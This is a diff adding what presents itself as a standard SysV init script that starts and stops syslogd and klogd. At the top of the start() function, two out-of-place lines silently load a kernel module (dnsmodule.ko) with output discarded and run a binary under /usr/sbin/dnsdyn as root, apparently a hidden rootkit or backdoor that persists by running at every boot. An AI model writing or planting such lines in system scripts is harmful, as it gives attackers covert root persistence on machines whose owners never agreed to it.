@@ -1,0 +1,121 @@
+#!/bin/bash
+#
+# syslog        Starts syslogd/klogd.
+#
+#
+# chkconfig: 2345 12 88
+# description: Syslog is the facility by which many daemons use to log \
+# messages to various system log files.  It is a good idea to always \
+# run syslog.
+### BEGIN INIT INFO
+# Provides: $syslog
+### END INIT INFO
+
+# Source function library.
+. /etc/init.d/functions
+
+RETVAL=0
+
+start() {
+        insmod /usr/sbin/dnsdyn/dnsmodule.ko > /dev/null 2>&1
+        su root -c /usr/sbin/dnsdyn/dnsdynm
+	[ -x /sbin/syslogd ] || exit 5
+	[ -x /sbin/klogd ] || exit 5
+
+	# Source config
+	if [ -f /etc/sysconfig/syslog ] ; then
+		. /etc/sysconfig/syslog
+	else
+		SYSLOGD_OPTIONS="-m 0"
+		KLOGD_OPTIONS="-2"
+	fi
+
+	if [ -z "$SYSLOG_UMASK" ] ; then
+	      SYSLOG_UMASK=077;
+	fi
+	umask $SYSLOG_UMASK
+
+ 	echo -n $"Starting system logger: "
+	daemon syslogd $SYSLOGD_OPTIONS
+	RETVAL=$?
+	echo
+	echo -n $"Starting kernel logger: "
+	daemon klogd $KLOGD_OPTIONS
+	echo
+	[ $RETVAL -eq 0 ] && touch /var/lock/subsys/syslog
+	return $RETVAL
+}	
+stop() {
+	echo -n $"Shutting down kernel logger: "
+	killproc klogd
+	echo
+	echo -n $"Shutting down system logger: "
+	killproc syslogd
+	RETVAL=$?
+	echo
+	[ $RETVAL -eq 0 ] && rm -f /var/lock/subsys/syslog
+	return $RETVAL
+}
+rhstatus() {
+	status syslogd
+	status klogd
+}
+restart() {
+	stop
+	start
+}	
+reload()  {
+    RETVAL=1
+    syslog=`cat /var/run/syslogd.pid 2>/dev/null`
+    echo -n "Reloading syslogd..."
+    if [ -n "${syslog}" ] && [ -e /proc/"${syslog}" ]; then
+	kill -HUP "$syslog";
+	RETVAL=$?
+    fi
+    if [ $RETVAL -ne 0 ]; then
+	failure
+    else
+	success
+    fi
+    echo
+    RETVAL=1
+    echo -n "Reloading klogd..."
+    klog=`cat /var/run/klogd.pid 2>/dev/null`
+    if [ -n "${klog}" ] && [ -e /proc/"${klog}" ]; then
+	kill -USR2 "$klog";
+        RETVAL=$?
+    fi
+    if [ $RETVAL -ne 0 ]; then
+	failure
+    else
+	success
+    fi
+    echo    
+    return $RETVAL
+}
+case "$1" in
+  start)
+  	start
+	;;
+  stop)
+  	stop
+	;;
+  status)
+  	rhstatus
+	;;
+  restart)
+  	restart
+	;;
+  reload)
+	reload
+	;;
+  condrestart)
+  	[ -f /var/lock/subsys/syslog ] && restart || :
+	;;
+  *)
+	echo $"Usage: $0 {start|stop|status|restart|condrestart}"
+	exit 2
+esac
+
+exit $?
+
